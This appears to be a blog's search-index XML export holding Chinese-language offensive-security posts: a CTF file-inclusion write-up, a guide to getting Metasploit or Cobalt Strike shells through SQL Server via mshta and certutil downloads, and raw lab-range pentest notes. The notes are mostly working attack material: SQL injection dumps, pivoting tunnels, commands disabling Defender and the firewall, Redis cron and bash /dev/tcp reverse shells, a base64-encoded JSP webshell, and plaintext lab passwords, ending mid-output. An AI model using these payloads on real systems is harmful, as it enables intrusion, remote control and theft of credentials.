<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NewStarCTF2023å…¬å¼€èµ›é“WEEK3</title>
      <link href="/2023/11/27/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK3/"/>
      <url>/2023/11/27/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK3/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="Include-ğŸ"><a href="#Include-ğŸ" class="headerlink" title="Include ğŸ"></a>Include ğŸ</h5><p>ç»å…¸æ–‡ä»¶åŒ…å«å†™shellï¼Œè¿›è¡Œrceï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰“phpinfoçš„æ—¶å€™ï¼Œæ˜¯å­˜åœ¨å‡flagçš„çš„ï¼Œfake{Check_register_argc_argv}ï¼Œè®©æ‰“è¿™ä¸ªregister_argc_argvå‡½æ•°</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127153538006.png" alt="image-20231127153538006"></p><p>ç»å…¸æ‰“æ³•ï¼Œçœ‹è¿™å‡½æ•°æ˜¯å¦æ˜¯on</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127153719625.png" alt="image-20231127153719625"></p><p>ç›´æ¥pocæ‰“ï¼Œå†™å…¥æ–‡ä»¶å³å¯ï¼Œ<code>/?file=/usr/local/lib/php/pearcmd&amp;aaaa+config-create+/var/www/html/&lt;?=eval($_POST[1]);?&gt;+32.php</code></p><p>è¯¦ç»†è§å¤§å¸ˆå‚…åšå®¢<code>https://cloud.tencent.com/developer/article/2204400?areaId=106001</code></p><p>å³å¯å†™å…¥webshellï¼Œå»ºè®®burpä¸­æ‰“ï¼Œä¸ç„¶å®¹æ˜“ä¹±ç ã€‚</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127153922543.png" alt="image-20231127153922543"></p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127153942182.png" alt="image-20231127153942182"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlserverä¸Šçº¿csormsf</title>
      <link href="/2023/11/26/sqlserver%E4%B8%8A%E7%BA%BFcsormsf/"/>
      <url>/2023/11/26/sqlserver%E4%B8%8A%E7%BA%BFcsormsf/</url>
      
        <content type="html"><![CDATA[<p>å½“æˆ‘æ²¡æ‹¿åˆ°ä¸€ä¸ªsqlserverçš„æƒé™æ—¶ï¼Œæƒé™å¾ˆå°ï¼Œä¸”æœ‰wafçš„æƒ…å†µä¸‹ï¼Œä¸”åªèƒ½é€è¿‡webæ‰§è¡Œå‘½ä»¤ï¼Œä¸Šçº¿åˆ°msfæˆ–è€…csã€‚</p><p><img src="/images/others/image-20231126153013346.png" alt="image-20231126153013346"></p><p>å…ˆçœ‹ä¸€ä¸‹æ€è½¯</p><p><img src="/images/others/image-20231126153201821.png" alt="image-20231126153201821"></p><p>å¾ˆå¤šï¼Œè¿˜æœ‰å›½å¤–çš„ã€‚</p><p>è¿™é‡Œé‡‡ç”¨mshtaå…æ€ä¸Šçº¿ï¼Œå‚è€ƒæ–‡ç« <code>https://www.zhihuifly.com/t/topic/2534</code></p><p>é¦–å…ˆæ•´ä¸ªæ¨¡æ¿æ–‡ä»¶<a href="https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta%EF%BC%8C%E5%9C%A8%E8%BF%99%E4%B8%AA%E9%87%8C%EF%BC%8C">https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.htaï¼Œåœ¨è¿™ä¸ªé‡Œï¼Œ</a></p><p>ç„¶åä½¿ç”¨cs æˆ–è€…msfç”Ÿæˆä¸€ä¸ªraw æ–‡ä»¶</p><p><code>msfvenom -a x86 -p windows/meterpreter/reverse_https LHOST=10.211.55.2 LPORT=3333 -f raw -o payload.bin</code></p><p>cs  attacks</p><p><img src="/images/others/image-20231126154223169.png" alt="image-20231126154223169"></p><p>è¿™é‡Œæ³¨æ„æ˜¯32ä½çš„</p><p>ç„¶å<code>cat payload.bin | base64 -w 0</code></p><p><img src="/images/others/image-20231126153450897.png" alt="image-20231126153450897"></p><p>æŠŠå¾—åˆ°çš„å†…å®¹å†™è¿›æ¨¡æ¿é‡Œ</p><p><img src="/images/others/image-20231126154351504.png" alt="image-20231126154351504"></p><p>ç„¶åèµ·ä¸€ä¸ªpythonæœåŠ¡å™¨å³å¯ï¼Œ</p><p>msfçš„è¦èµ·ç›‘å¬</p><p>use exploit/multi/handler</p><p>payload æ¢æ‰  set payload windows/meterpreter/reverse_https</p><p>æ‰§è¡Œå‘½ä»¤å³å¯</p><p><code>mshta http://ip:port/msta.hta</code></p><p><img src="/images/others/image-20231126154622099.png" alt="image-20231126154622099"></p><p><img src="/images/others/image-20231126154730372.png" alt="image-20231126154730372"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cmd= <span class="string">&quot;;DECLARE @er VARCHAR(8000);SET @er=0x16è¿›åˆ¶;EXEC master..xp_cmdshell @er&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd2=<span class="string">&quot;declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami&#x27;&quot;</span></span><br><span class="line">cmd3=<span class="string">&quot;declare @o int exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\Windows\System32\certutil.exe&#x27; ,&#x27;c:\windows\temp\sethc.exe&#x27;;&quot;</span></span><br><span class="line">cmd4=<span class="string">&quot;declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\sethc.exe -urlcache -split -f &#x27;http://ip:port/SKXT.exe&#x27; C:\Windows\Temp\shell.exe&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd11=<span class="string">&quot;exec sp_configure &#x27;show advanced options&#x27;, 1;  RECONFIGURE;  exec sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  RECONFIGURE;&quot;</span></span><br><span class="line">cmd12=<span class="string">&quot;declare @o int exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\\Windows\\System32\\certutil.exe&#x27; ,&#x27;c:\\windows\\temp\\sethc.exe&#x27;;&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
            <tag> cs </tag>
            
            <tag> sqlserver </tag>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cfs</title>
      <link href="/2023/11/17/cfs/"/>
      <url>/2023/11/17/cfs/</url>
      
        <content type="html"><![CDATA[<p>rootå¯†ç ï¼šteamssix.com</p><p>æ­¤ä¸»æœºçš„IPåœ°å€ï¼š<br>192.168.1.11<br>192.168.22.11</p><p>å®å¡”åå°ç™»é™†åœ°å€åŠå¯†ç ï¼š<br>åœ°å€ï¼š<a href="http://192.168.1.11:8888/a768f109/">http://192.168.1.11:8888/a768f109/</a><br>è´¦å·ï¼šeaj3yhsl<br>å¯†ç ï¼š41bb8fee</p><p>rootå¯†ç ï¼šteamssix.com</p><p>æ­¤ä¸»æœºçš„IPåœ°å€ï¼š<br>192.168.22.22<br>192.168.33.22</p><p>å®å¡”åå°ç™»é™†åœ°å€åŠå¯†ç ï¼š<br>åœ°å€ï¼š<a href="http://192.168.22.22:8888/2cc52ec0/">http://192.168.22.22:8888/2cc52ec0/</a><br>è´¦å·ï¼šxdynr37d<br>å¯†ç ï¼š123qwe..</p><p>GET /index.php?r=vul&amp;keyword=1â€™ union%20select%20database(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39â€“%20123<br><a href="http://192.168.22.129/index.php?r=vul&amp;keyword=1&#39;">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#39;</a> union select databases(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39â€“ 123<br>GET /index.php?r=vul&amp;keyword=1â€™ union select database(),1,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39  from information_schema.tables where table_schema=â€™bagecmsâ€™â€“%2012<br>bage_ad,bage_admin,bage_admin_group,bage_admin_logger,bage_attr,bage_attr_val,bage_catalog,bage_config,bage_link,bage_page,bage_post,bage_post_2tags,bage_post_album,bage_post_comment,bage_post_tags,bage_question,bage_special,bage_upload</p><p>id,username,password,realname,group_id,email,qq,notebook,mobile,telephone,last_login_ip,last_login_time,login_count,status_is,create_time<br>GET /index.php?r=vul&amp;keyword=1â€™ union select database(),1,1,id,username,password,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39 from bagecms.bage_adminâ€“%20123 HTTP/1.1<br>Array<br>(<br>    [0] =&gt; Post Object<br>        (<br>            [_new:CActiveRecord:private] =&gt;<br>            [_attributes:CActiveRecord:private] =&gt; Array<br>                (<br>                    [id] =&gt; bagecms<br>                    [user_id] =&gt; 1<br>                    [nickname] =&gt; 1<br>                    [author] =&gt; 1<br>                    [title] =&gt; admin<br>                    [title_second] =&gt; 46f94c8de14fb36680850768ff1b7f2a<br>123qwe</p><p>./ew -s lcx_tran -l 17777 -f 192.168.22.129 -g 17775 -t 1000000<br>./ew -s ssocksd -l 17775 -t 1000000</p><p>ä¸­é—´æœºå™¨<br>./ew -s lcx_slave -d 192.168.144.142 -e 37779 -f 192.168.33.33 -g 39999 -t 100000</p><p>å·¦è¾¹æœºå™¨<br>./ew -s lcx_listen -l 37777 -e 37779 -t 100000</p><p>å³è¾¹æœºå™¨<br>.\ew_for_Win.exe -s ssocksd -l 39999 -t 100000</p><p>setg Proxies socks5:ip2:8321 è®¾ç½®å…¨å±€ä»£ç†<br>set ReverseAllowProxy true è¿™ä¸ªå‚æ•°æ˜¯å› ä¸ºä½¿ç”¨å…¨å±€ä»£ç†ï¼Œå¯èƒ½ä¼šå¯¼è‡´æˆ‘ä»¬çš„shellæ— æ³•åå¼¹ï¼Œæ‰€ä»¥éœ€è¦å¼€å¯ã€‚<br>ip2:8321</p><p>ä¸­é—´zuoæœºå™¨<br>./ew -s lcx_slave -d 192.168.144.142 -e 37779 -f 192.168.33.33 -g 39998 -t 100000</p><p>ä¸­é—´youæœºå™¨<br>.\ew_for_Win.exe -s lcx_slave -d 192.168.22.129 -e 39998 -f 192.168.44.130 -g 39989 -t 100000<br>.\ew_for_Win.exe -s lcx_slave -d 192.168.33.128 -e 39998 -f 192.168.44.130 -g 39989 -t 100000<br>å·¦è¾¹æœºå™¨<br>./ew -s lcx_listen -l 37777 -e 37779 -t 100000</p><p>å³è¾¹æœºå™¨<br>.\ew_for_Win.exe -s ssocksd -l 39989 -t 100000</p><p>proxychains nmap -Pn -sT -T4 -F 192.168.88.100</p><p>8A..;123admin</p><p>dynamic_chain ï¼šåŠ¨æ€æ¨¡å¼,æŒ‰ç…§ä»£ç†åˆ—è¡¨é¡ºåºè‡ªåŠ¨é€‰å–å¯ç”¨ä»£ç†<br>strict_chain ï¼šä¸¥æ ¼æ¨¡å¼,ä¸¥æ ¼æŒ‰ç…§ä»£ç†åˆ—è¡¨é¡ºåºä½¿ç”¨ä»£ç†ï¼Œæ‰€æœ‰ä»£ç†å¿…é¡»å¯ç”¨<br>round_robin_chain ï¼šè½®è¯¢æ¨¡å¼ï¼Œè‡ªåŠ¨è·³è¿‡ä¸å¯ç”¨ä»£ç†<br>random_chain ï¼šéšæœºæ¨¡å¼,éšæœºä½¿ç”¨ä»£ç†</p><p>administrator/admin@123</p><p>vulntarget\win2008<br>qweASD123</p><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminalâ€ â€œServer /v fDenyTSConnections /t REG_DWORD /d 0 /f</p><p>netsh advfirewall set allprofiles state off</p><p>set-MpPreference -DisableRealtimeMonitoring $true</p><p>dir \WIN-1PV25H8UJPN.vulntarget.com dir<br>schtasks /create /s WIN-1PV25H8UJPN.vulntarget.com /tn test /sc minute /mo 1 /tr â€œC:\Windows\System32\cmd.exe /c â€˜whoami &gt; C:\Users\Administrator\result.txtâ€™â€ /ru system /f<br>dir \WIN-1PV25H8UJPN.vulntarget.com\C$<br>C:\Users\Administrator\Desktop\PSTools&gt;PsExec.exe -accepteula \WIN-1PV25H8UJPN cmd.exe</p><p>set xxoo â€œ\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/172.16.100.21/10001 0&gt;&amp;1\n\nâ€</p><p>proxychains echo -e â€œ\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/172.16.100.21/1234 0&gt;&amp;1\n\nâ€|redis-cli -h 172.17.20.250 -a 123456 -x set 1<br>proxychains redis-cli -h 172.17.20.250 -a 123456 config set dir /var/spool/cron/<br>proxychains redis-cli -h 172.17.20.250 -a 123456 config set dbfilename redis<br>proxychains redis-cli -h 172.17.20.250 -a 123456 save</p><p>nc -l -p 1234 -vv</p><p>/ /<em>\_</em><strong><em>_</em> \ (</strong>| | | (<em>| | (<strong>|   &lt;<br>_</strong></em>/     |<em><strong>/_</strong>|</em>|  _<em>,</em>|__<em>|</em>|_<br>                     fscan version: 1.6.3<br>start infoscan<br>(icmp) Target â€˜172.17.20.1â€™ is alive<br>(icmp) Target â€˜172.17.20.10â€™ is alive<br>(icmp) Target â€˜172.17.20.110â€™ is alive<br>(icmp) Target â€˜172.17.20.250â€™ is alive<br>(icmp) Target â€˜172.17.20.113â€™ is alive<br>icmp alive hosts len is: 5<br>172.17.20.110:7001 open</p><p>172.17.20.250:6379 open<br>172.17.20.250:3306 open</p><p>172.17.20.113:445 open<br>172.17.20.113:139 open</p><p>172.17.20.250:22 open<br>172.17.20.113:135 open<br>172.17.20.113:80 open</p><p>172.17.20.10:80 open</p><p>172.17.20.10:22 open<br>172.17.20.10:443 open<br>172.17.20.1:3000 open<br>alive ports len is: 12<br>start vulscan<br>[+] Redis:172.17.20.250:6379 123456<br>[+] Redis:172.17.20.250:6379 like can write /var/spool/cron/<br>NetInfo:<br>[<em>]172.17.20.113<br>   [-&gt;]WIN-MS7AC966K31<br>   [-&gt;]172.17.20.113<br>[</em>] WebTitle:<a href="http://172.17.20.113/">http://172.17.20.113</a>      code:200 len:39     title:Office Anywhere 2017ç‰ˆ ç½‘ç»œæ™ºèƒ½åŠå…¬ç³»ç»Ÿ<br>[<em>] 172.17.20.113        WORKGROUP\WIN-MS7AC966K31   Windows Server 2012 R2 Standard 9600<br>[+] InfoScan:<a href="http://172.17.20.113/">http://172.17.20.113</a>      [é€šè¾¾OA]<br>[</em>] WebTitle:<a href="http://172.17.20.10/">http://172.17.20.10</a>       code:200 len:7      title:Meetsec<br>[*] WebTitle:<a href="https://172.17.20.10/">https://172.17.20.10</a>      code:200 len:7      title:Meetsec</p><p>/home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war</p><p>bash -i &gt;&amp; /dev/tcp/172.16.100.21/10002 0&gt;&amp;1</p><p>echo PCUhIFN0cmluZyB4Yz0iM2M2ZTBiOGE5YzE1MjI0YSI7IFN0cmluZyBwYXNzPSJwYXNzIjsgU3RyaW5nIG1kNT1tZDUocGFzcyt4Yyk7IGNsYXNzIFggZXh0ZW5kcyBDbGFzc0xvYWRlcntwdWJsaWMgWChDbGFzc0xvYWRlciB6KXtzdXBlcih6KTt9cHVibGljIENsYXNzIFEoYnl0ZVtdIGNiKXtyZXR1cm4gc3VwZXIuZGVmaW5lQ2xhc3MoY2IsIDAsIGNiLmxlbmd0aCk7fSB9cHVibGljIGJ5dGVbXSB4KGJ5dGVbXSBzLGJvb2xlYW4gbSl7IHRyeXtqYXZheC5jcnlwdG8uQ2lwaGVyIGM9amF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KG0/MToyLG5ldyBqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjKHhjLmdldEJ5dGVzKCksIkFFUyIpKTtyZXR1cm4gYy5kb0ZpbmFsKHMpOyB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXtyZXR1cm4gbnVsbDsgfX0gcHVibGljIHN0YXRpYyBTdHJpbmcgbWQ1KFN0cmluZyBzKSB7U3RyaW5nIHJldCA9IG51bGw7dHJ5IHtqYXZhLnNlY3VyaXR5Lk1lc3NhZ2VEaWdlc3QgbTttID0gamF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0LmdldEluc3RhbmNlKCJNRDUiKTttLnVwZGF0ZShzLmdldEJ5dGVzKCksIDAsIHMubGVuZ3RoKCkpO3JldCA9IG5ldyBqYXZhLm1hdGguQmlnSW50ZWdlcigxLCBtLmRpZ2VzdCgpKS50b1N0cmluZygxNikudG9VcHBlckNhc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge31yZXR1cm4gcmV0OyB9IHB1YmxpYyBzdGF0aWMgU3RyaW5nIGJhc2U2NEVuY29kZShieXRlW10gYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtTdHJpbmcgdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldEVuY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlVG9TdHJpbmciLCBuZXcgQ2xhc3NbXSB7IGJ5dGVbXS5jbGFzcyB9KS5pbnZva2UoRW5jb2RlciwgbmV3IE9iamVjdFtdIHsgYnMgfSk7fSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt0cnkgeyBiYXNlNjQ9Q2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RW5jb2RlciIpOyBPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5uZXdJbnN0YW5jZSgpOyB2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlIiwgbmV3IENsYXNzW10geyBieXRlW10uY2xhc3MgfSkuaW52b2tlKEVuY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlMikge319cmV0dXJuIHZhbHVlOyB9IHB1YmxpYyBzdGF0aWMgYnl0ZVtdIGJhc2U2NERlY29kZShTdHJpbmcgYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtieXRlW10gdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgZGVjb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldERlY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChieXRlW10pZGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlIiwgbmV3IENsYXNzW10geyBTdHJpbmcuY2xhc3MgfSkuaW52b2tlKGRlY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7dHJ5IHsgYmFzZTY0PUNsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NERlY29kZXIiKTsgT2JqZWN0IGRlY29kZXIgPSBiYXNlNjQubmV3SW5zdGFuY2UoKTsgdmFsdWUgPSAoYnl0ZVtdKWRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZUJ1ZmZlciIsIG5ldyBDbGFzc1tdIHsgU3RyaW5nLmNsYXNzIH0pLmludm9rZShkZWNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZTIpIHt9fXJldHVybiB2YWx1ZTsgfSU+PCV0cnl7Ynl0ZVtdIGRhdGE9YmFzZTY0RGVjb2RlKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKHBhc3MpKTtkYXRhPXgoZGF0YSwgZmFsc2UpO2lmIChzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpPT1udWxsKXtzZXNzaW9uLnNldEF0dHJpYnV0ZSgicGF5bG9hZCIsbmV3IFgodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLlEoZGF0YSkpO31lbHNle3JlcXVlc3Quc2V0QXR0cmlidXRlKCJwYXJhbWV0ZXJzIixkYXRhKTtqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSBhcnJPdXQ9bmV3IGphdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtKCk7T2JqZWN0IGY9KChDbGFzcylzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpKS5uZXdJbnN0YW5jZSgpO2YuZXF1YWxzKGFyck91dCk7Zi5lcXVhbHMocGFnZUNvbnRleHQpO3Jlc3BvbnNlLmdldFdyaXRlcigpLndyaXRlKG1kNS5zdWJzdHJpbmcoMCwxNikpO2YudG9TdHJpbmcoKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShiYXNlNjRFbmNvZGUoeChhcnJPdXQudG9CeXRlQXJyYXkoKSwgdHJ1ZSkpKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDE2KSk7fSB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXt9IAolPg==</p><p>echo PCUhIFN0 |base64 -d &gt; /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp<br>cat /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp</p><p><a href="http://172.16.100.21:7001/bea_wls_internal/a.jsp">http://172.16.100.21:7001/bea_wls_internal/a.jsp</a></p><p>echo â€˜aâ€™ &gt; /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp</p><p>mysql -h 172.17.20.250 -u typecho -p</p><p>bash -i &gt;&amp; /dev/tcp/172.16.100.21/2333 0&gt;&amp;1</p><p> This is the sshd server system-wide configuration file.  See<br> sshd_config(5) for more information.</p><p> This sshd was compiled with PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</p><p> The strategy used for options in the default sshd_config shipped with<br> OpenSSH is to specify options with their default value where<br> possible, but leave them commented.  Uncommented options override the<br> default value.</p><p>Include /etc/ssh/sshd_config.d/*.conf</p><p>Port 22<br>AddressFamily any<br>ListenAddress 0.0.0.0<br>ListenAddress ::</p><p>HostKey /etc/ssh/ssh_host_rsa_key<br>HostKey /etc/ssh/ssh_host_ecdsa_key<br>HostKey /etc/ssh/ssh_host_ed25519_key</p><p> Ciphers and keying<br>RekeyLimit default none</p><p> Logging<br>SyslogFacility AUTH<br>LogLevel INFO</p><p> Authentication:</p><p>LoginGraceTime 2m<br>PermitRootLogin prohibit-password<br>StrictModes yes<br>MaxAuthTries 6<br>MaxSessions 10</p><p>PubkeyAuthentication yes</p><p> Expect .ssh/authorized_keys2 to be disregarded by default in future.<br>AuthorizedKeysFile    .ssh/authorized_keys .ssh/authorized_keys2</p><p>AuthorizedPrincipalsFile none</p><p>AuthorizedKeysCommand none<br>AuthorizedKeysCommandUser nobody</p><p> For this to work you will also need host keys in /etc/ssh/ssh_known_hosts<br>HostbasedAuthentication no<br> Change to yes if you don&apos;t trust ~/.ssh/known_hosts for<br> HostbasedAuthentication<br>IgnoreUserKnownHosts no<br> Don&apos;t read the user&apos;s ~/.rhosts and ~/.shosts files<br>IgnoreRhosts yes</p><p> To disable tunneled clear text passwords, change to no here!<br>PasswordAuthentication yes<br>PermitEmptyPasswords no</p><p> Change to yes to enable challenge-response passwords (beware issues with<br> some PAM modules and threads)<br>KbdInteractiveAuthentication no</p><p> Kerberos options<br>KerberosAuthentication no<br>KerberosOrLocalPasswd yes<br>KerberosTicketCleanup yes<br>KerberosGetAFSToken no</p><p> GSSAPI options<br>GSSAPIAuthentication no<br>GSSAPICleanupCredentials yes<br>GSSAPIStrictAcceptorCheck yes<br>GSSAPIKeyExchange no</p><p> Set this to &apos;yes&apos; to enable PAM authentication, account processing,<br> and session processing. If this is enabled, PAM authentication will<br> be allowed through the KbdInteractiveAuthentication and<br> PasswordAuthentication.  Depending on your PAM configuration,<br> PAM authentication via KbdInteractiveAuthentication may bypass<br> the setting of &quot;PermitRootLogin without-password&quot;.<br> If you just want the PAM account and session checks to run without<br> PAM authentication, then enable this but set PasswordAuthentication<br> and KbdInteractiveAuthentication to &apos;no&apos;.<br>UsePAM yes</p><p>AllowAgentForwarding yes<br>AllowTcpForwarding yes<br>GatewayPorts no<br>X11Forwarding yes<br>X11DisplayOffset 10<br>X11UseLocalhost yes<br>PermitTTY yes<br>PrintMotd no<br>PrintLastLog yes<br>TCPKeepAlive yes<br>PermitUserEnvironment no<br>Compression delayed<br>ClientAliveInterval 0<br>ClientAliveCountMax 3<br>UseDNS no<br>PidFile /run/sshd.pid<br>MaxStartups 10:30:100<br>PermitTunnel no<br>ChrootDirectory none<br>VersionAddendum none</p><p> no default banner path<br>Banner none</p><p> Allow client to pass locale environment variables<br>AcceptEnv LANG LC_*</p><p> override default of no subsystems<br>Subsystem sftp    /usr/lib/openssh/sftp-server</p><p> Example of overriding settings on a per-user basis<br>Match User anoncvs<br>    X11Forwarding no<br>    AllowTcpForwarding no<br>    PermitTTY no<br>    ForceCommand cvs server<br>PasswordAuthentication yes</p><h2 id="lse-sh"><a href="#lse-sh" class="headerlink" title="$ ./lse.sh"></a>$ ./lse.sh</h2><h2 id="If-you-know-the-current-user-password-write-it-here-to-check-sudo-privileges"><a href="#If-you-know-the-current-user-password-write-it-here-to-check-sudo-privileges" class="headerlink" title="If you know the current user password, write it here to check sudo privileges:"></a>If you know the current user password, write it here to check sudo privileges:</h2><p> LSE Version: 4.5nw</p><pre><code>    User: acequan User ID: 1000Password: none    Home: /home/acequan    Path: /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/bin:/home/acequan/Oracle/Middleware/                                                                                     Oracle_Home/wlserver/server/bin:/home/acequan/Oracle/Middleware/Oracle_Home/wlserver/../oracle_common/modules/thirdparty/org.a                                                                                     pache.ant/1.10.5.0.0/apache-ant-1.10.5/bin:/usr/lib/jvm/jre/bin:/usr/lib/jvm/bin:/usr/lib/jvm/bin:/usr/local/sbin:/usr/local/b                                                                                     in:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/snap/bin   umask: 0027Hostname: meetsec-devserver   Linux: 5.15.0-43-generic</code></pre><p>Distribution: Ubuntu 22.04.1 LTS<br>Architecture: x86_64</p><p>=====================( Current Output Verbosity Level: 0 )======================<br>===============================================================( humanity 